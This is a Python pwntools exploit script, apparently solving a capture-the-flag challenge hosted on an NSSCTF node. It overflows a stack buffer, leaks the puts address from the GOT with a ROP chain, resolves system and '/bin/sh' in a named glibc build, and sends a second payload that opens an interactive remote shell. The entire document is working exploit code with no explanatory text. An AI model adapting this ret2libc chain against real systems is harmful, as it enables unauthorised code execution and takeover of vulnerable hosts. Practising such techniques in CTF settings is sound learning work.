from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug')
elf=ELF('./pwn')
p=remote('node4.anna.nssctf.cn',28395)

puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
read_got=elf.got['read']
read_plt=elf.plt['read']
main_addr=0x40066B
rdi_addr=0x0000000000400743

payload=flat([cyclic(64+8),rdi_addr,puts_got,puts_plt,main_addr])

p.sendlineafter("Do you know how to do buffer overflow?",payload)
leak_puts=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.success(hex(leak_puts))

libc=ELF('libc6_2.27-3ubuntu1.3_amd64.so')

libc_base=leak_puts-libc.symbols['puts']
sys_addr=libc_base+libc.symbols['system']
sh_addr=libc_base+next(libc.search('/bin/sh'))
ret_addr=0x0000000000400506
payload=flat([cyclic(64+8),ret_addr,rdi_addr,sh_addr,sys_addr,main_addr])

p.sendlineafter("Do you know how to do buffer overflow?",payload)
p.interactive()
